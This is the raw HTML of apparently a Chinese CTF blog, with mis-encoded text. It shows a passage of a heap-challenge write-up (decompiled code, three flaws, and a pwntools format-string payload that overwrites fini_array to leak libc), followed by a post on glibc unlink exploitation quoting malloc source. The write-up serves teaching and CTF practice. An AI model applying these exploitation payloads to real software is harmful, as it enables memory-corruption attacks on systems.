class="built_in">puts</span>(<span class="string">&quot;Enter first order:&quot;</span>);</span><br><span class="line">        edit(v6);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Enter second order:&quot;</span>);</span><br><span class="line">        edit(v7);</span><br><span class="line">        <span class="built_in">strcpy</span>(dest, <span class="string">&quot;Your order is submitted!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v6);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">        <span class="keyword">delete</span>(v7);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">        v5 = <span class="built_in">malloc</span>(<span class="number">0x140</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          fwrite(<span class="string">&quot;Something failed!\n&quot;</span>, <span class="number">1uLL</span>, <span class="number">0x12</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sub_400937(v5, v6, v7);</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">printf</span>(dest);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>editå‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fgetc(<span class="built_in">stdin</span>);</span><br><span class="line">    v1 = v3++;</span><br><span class="line">    *(v1 + a1) = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  *(v3 - <span class="number">1LL</span> + a1) = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>deleteå‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">delete</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">free</span>(a1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥åŠé€‰æ‹©â€™5â€˜ä¹‹åä¼šè°ƒç”¨çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400937</span><span class="params">(<span class="keyword">char</span> *a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">const</span> <span class="keyword">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(a1, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a2, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(a1, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a3);</span><br><span class="line">  <span class="built_in">strncat</span>(a1, a3, v4);</span><br><span class="line">  *&amp;a1[<span class="built_in">strlen</span>(a1)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°çš„åŠŸèƒ½å°±æ˜¯æ‹·è´v6å’Œv7æ‰€æŒ‡å‘çš„chunkä¸­çš„å†…å®¹åˆ°v5æ‰€æŒ‡å‘çš„chunkä¸­ï¼Œv5æœ€åç”¨äºè¾“å‡ºã€‚</p>
<p>ç¨‹åºçš„é€»è¾‘å¾ˆç®€å•ï¼Œå…ˆæŒ‰é¡ºåºç”³è¯·å‡ºchunk1ã€chunk2ï¼ˆv6ã€v7æ‰€å¯¹åº”çš„chunkï¼‰ä»¥åŠdestä¸‰ä¸ªå—ï¼Œå¤§å°éƒ½ä¸º0x90ã€‚å¹¶ä¸”å¯ä»¥ä»»æ„ç¼–è¾‘chunk1è·Ÿchunk2ä¸­çš„å†…å®¹ã€‚</p>
<p>æ€»çš„æ¥è¯´æœ¬é¢˜çš„ä¸‰ä¸ªæ¼æ´ç‚¹ä¸ºï¼šâ‘  editå‡½æ•°ä¸­çš„ä»»æ„é•¿åº¦å †æº¢å‡ºã€‚â‘¡ deleteä¸­çš„uafã€‚â‘¢ mainå‡½æ•°æœ«å°¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚</p>
<h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>é¦–å…ˆæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„ä¸€ç‚¹æ˜¯ç¨‹åºä¸­å¯ä»¥ç”¨æ¥æ³„æ¼çš„ä¸€ä¸ªç‚¹åªæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åmainå‡½æ•°å°±è¿”å›äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šè¿˜å¾—ç”¨æŸç§æ–¹å¼è®©ç¨‹åºå†è¿”å›åˆ°æˆ‘ä»¬å¸Œæœ›çš„åœ°æ–¹ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬ä¸€èˆ¬å°±ä¼šæƒ³åˆ°ä¿®æ”¹fini_array0ä¸ºmain_addræ¥å®ç°ï¼Œç”±äºæ²¡å¼€å¯PIEï¼Œæ‰€ä»¥è¿™ä¸ªæ€è·¯æ˜¯å¯è¡Œçš„ã€‚</p>
<h4 id="ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ„é€ "><a href="#ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ„é€ " class="headerlink" title="ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ„é€ "></a>ä¸€ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ„é€ </h4><p>é‚£ä¹ˆæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯æ€è€ƒæ€ä¹ˆæ„é€ è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œå› ä¸ºå…¶å‚æ•°æ˜¯destï¼Œè€Œä¸”æˆ‘ä»¬æ¯æ¬¡editå®Œä¹‹åéƒ½ä¼šè°ƒç”¨strcpyæ¥å¾€destä¸­å†™å…¥å­—ç¬¦ä¸²ï¼Œè€Œstrcpyå‡½æ•°ä¼šåœ¨æœ€åè¡¥ä¸€ä¸ªç»“æŸç¬¦ï¼Œæ‰€ä»¥å°±ç®—æˆ‘ä»¬èƒ½åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹destä¸­çš„å†…å®¹ä¹Ÿæ²¡ç”¨ï¼Œæœ€åä¼šè¢«æˆªæ–­ã€‚</p>
<p>é‚£ä¹ˆæ˜¾ç„¶æˆ‘ä»¬å°±åªèƒ½é <code>sub_400937()</code>å‡½æ•°äº†ï¼Œå› ä¸ºåœ¨è¿™ä¸ªå‡½æ•°é‡Œå…¶ä¼šå°†chunk1å’Œchunk2çš„å†…å®¹æ‹·è´åˆ°v5å¯¹åº”çš„æ•°ç»„ä¸­ï¼Œè€Œv5å¯¹åº”çš„chunkæ˜¯åœ¨æˆ‘ä»¬é€‰æ‹©äº†â€™5â€™ä¹‹åå†ç”³è¯·çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è®©v5è·Ÿdestå †é‡å æ¥æ§åˆ¶destä¸­çš„å†…å®¹ã€‚</p>
<p>ä½†æ˜¯destä¸èƒ½ç›´æ¥è¢«freeæ‰ï¼Œæ‰€ä»¥åªèƒ½è®©v5è·Ÿchunk2é‡å ï¼Œç„¶åè¦†ç›–æ‰destã€‚</p>
<p>è¿™é‡Œæ—¢ç„¶è¦è®©v5è·Ÿchunk2é‡å ï¼Œé‚£ä¹ˆå°±è¦é€šè¿‡chunk1å»æ”¹æ‰chunk2çš„sizeï¼Œä½†æ˜¯å› ä¸ºæ”¹æ‰sizeä¹‹åfreeæ‰è¿™ä¸ªchunkæ—¶è¿˜è¦è¿‡glibcçš„æ£€æµ‹ï¼Œæ‰€ä»¥å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©<strong>å…ˆæŠŠchunk2 freeæ‰ï¼Œå†æŠŠå®ƒçš„sizeç›–æ‰</strong>ï¼Œè¿™æ ·å°±å‡å°‘äº†è¦ä¼ªé€ çš„æ•°æ®ï¼Œè€Œä¸”å…¶ä»unsorted binä¸­è¢«å–å‡ºçš„æ—¶å€™ä¹Ÿä¸ä¼šå¯¹è¿™ä¸ªchunkæœ‰æ‰€æ£€æŸ¥ã€‚</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦åœ¨chunk1é‡Œé¢æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒåŒæ—¶è¦æœ‰ä¸€æ®µpaddingä¿è¯åœ¨chunk1è·Ÿchunk2å¤åˆ¶å®Œåˆ°v5ä¹‹åï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æœ¬ä½“å‡ºç°åœ¨destä¸­ã€‚</p>
<p>è¿™ä¸€éƒ¨åˆ†è¦æè¿°å¤ªéº»çƒ¦äº†ï¼Œä½†æ˜¯å…¶å®å¹¶ä¸æ˜¯å¾ˆéš¾ï¼Œç¨å¾®è®¡ç®—ä¸‹paddingå³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">free2()</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">9</span> + <span class="string">&#x27;%63c%15$hn%2553c%14$hn&#x27;</span> + <span class="string">&#x27;%31$p&#x27;</span>	<span class="comment">#chunk1 start</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x6c</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">edit1(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(<span class="number">0x151</span>))</span><br><span class="line">edit1(payload)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">&#x27;5&#x27;</span> + <span class="string">&#x27;c&#x27;</span>*<span class="number">15</span> + p64(fini_array) + p64(fini_array+<span class="number">2</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">system = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7a2d840</span> - <span class="number">0x7ffff7a523a0</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system = &quot;</span>,<span class="built_in">hex</span>(system)</span><br></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬å®Œæˆäº†libcçš„æ³„æ¼å¹¶è¿”å›åˆ°mainå‡½æ•°</p>
<h4 id="äºŒã€åŠ«æŒ"><a href="#äºŒã€åŠ«æŒ" class="headerlink" title="äºŒã€åŠ«æŒ"></a>äºŒã€åŠ«æŒ</h4><p>åˆ°è¿™é‡Œè¿™é¢˜å…¶å®å°±æ²¡æœ‰éš¾ç‚¹äº†ï¼Œæ„Ÿè§‰è¿˜æ˜¯ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç®€å•ç‚¹ï¼Œæ‰€ä»¥æˆ‘åœ¨å‰é¢é‚£æ­¥å¤šæ³„æ¼äº†ä¸ªæ ˆåœ°å€ï¼Œç„¶åè¿”å›åœ°å€æ”¹one_gadgetå°±è¡Œäº†ï¼Œè¿™ä¸€éƒ¨åˆ†å¾ˆç®€å•å°±ä¸è´´expäº†ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/07/Unlink/" class="post-title-link" itemprop="url">Unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-07 17:29:42" itemprop="dateCreated datePublished" datetime="2022-05-07T17:29:42+08:00">2022-05-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-21 16:36:39" itemprop="dateModified" datetime="2022-05-21T16:36:39+08:00">2022-05-21</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é‡Œå…ˆè¯´æ€»ç»“ï¼Œè¯¦ç»†çš„ä¸‹é¢è¯´</p>
<p>æ€»çš„ä¸‹æ¥ï¼Œè¦åˆ©ç”¨unlinkå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š</p>
<ol>
<li><code>&amp;P</code>çš„åœ°å€å·²çŸ¥ï¼ˆä¿å­˜å †æŒ‡é’ˆçš„åœ°å€ï¼‰</li>
<li><code>&amp;P-0x18</code>åˆ°<code>&amp;P</code>è¿™æ®µç©ºé—´å¯å†™</li>
<li>è‡³å°‘å¾—æœ‰ä¸€ä¸ªoff-by-oneæ¥ä¿®æ”¹è¦freeæ‰çš„chunkçš„sizeä½ã€‚</li>
</ol>
<p>ç›®å‰æ„Ÿè§‰å°±è¿™ä¸‰ä¸ªæ¡ä»¶ï¼Œä½†æ˜¯ä¾‹é¢˜åœ¨2.27ä¸‹å¤ç°å¤±è´¥äº†ï¼Œæš‚æ—¶è¿˜ä¸çŸ¥é“ä¸ºå•¥</p>
<h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><p>Unlinkå¯¹åº”è§£é“¾çš„æ„æ€ï¼Œå…¶åœ¨libcé‡Œæ˜¯ä¸€ä¸ªå®å®šä¹‰ï¼Œä½œç”¨æ˜¯å°†ä¸€ä¸ªchunkä»åŒå‘é“¾è¡¨ä¸­å–å‡ºï¼Œè€Œä¸”å…¶è¿˜ä¼šæ£€æµ‹ä¸å–å‡ºçš„è¿™ä¸ªchunkçš„ç‰©ç†ç›¸é‚»çš„ä½ç½®æ˜¯å¦è¿˜æœ‰free chunkï¼Œå¦‚æœæœ‰åˆ™ä¼šè§¦å‘å‘å‰åˆå¹¶ï¼ˆè·Ÿç‰©ç†ä½åœ°å€çš„chunkåˆå¹¶ï¼‰/å‘ååˆå¹¶ï¼ˆè·Ÿç‰©ç†é«˜åœ°å€çš„chunkåˆå¹¶ï¼‰</p>
<p>ç»“åˆunlinkæºç çš„ä¸€éƒ¨åˆ†æ¥çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´ã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// é˜²æ­¢æ”»å‡»è€…ç®€å•ç¯¡æ”¹ç©ºé—²çš„ chunk çš„ fd ä¸ bk æ¥å®ç°ä»»æ„å†™çš„æ•ˆæœã€‚</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>

<h3 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h3><p>ä¸‹é¢æ˜¯glibc-2.30çš„ä¸€éƒ¨åˆ†æºç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="comment">//å¦‚æœinuseä½ä¸º0ï¼Œåˆ™è®©pæŒ‡é’ˆæŒ‡å‘å‰ä¸€ä¸ªchunkï¼Œè¿›è¡Œåç»­çš„unlinkæ“ä½œ</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">      <span class="comment">//å¦‚æœå‰ä¸€ä¸ªchunkçš„sizeä¸ç­‰äºåˆšåˆšçš„prev_sizeåˆ™æŠ¥é”™</span></span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æ˜¯unlink_chunkå‡½æ•°ï¼ˆä¼¼ä¹åœ¨æ–°ç‰ˆé‡Œunlinkå˜æˆä¸€ä¸ªå‡½æ•°äº†ï¼‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">    <span class="comment">//åˆ°è¿™é‡Œä¸ºæ­¢å°±æ˜¯åˆ©ç”¨çš„ä¸»è¦éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°å…¶å®æ€»ä½“æ²¡æœ‰å˜åŒ–</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">	  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">	malloc_printerr (<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">	    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">	      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">	  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="å…³äºFD-gt-bkå’ŒBK-gt-fd"><a href="#å…³äºFD-gt-bkå’ŒBK-gt-fd" class="headerlink" title="å…³äºFD-&gt;bkå’ŒBK-&gt;fd"></a>å…³äºFD-&gt;bkå’ŒBK-&gt;fd</h4><p>å…³äºè¿™ä¸ªä¸œè¥¿å§‹ç»ˆæœ‰äº›ç»†èŠ‚ä¸å¤ªç¡®å®šï¼Œæ‰€ä»¥å¹²è„†è‡ªå·±å†™ä¸ªdemoæ¥ç¡®å®šä¸€ä¸‹ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> prev_size;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">char</span>* fd;</span><br><span class="line">	<span class="keyword">char</span>* bk;</span><br><span class="line">&#125;chunk,*pchunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p2 = <span class="built_in">malloc</span>(<span 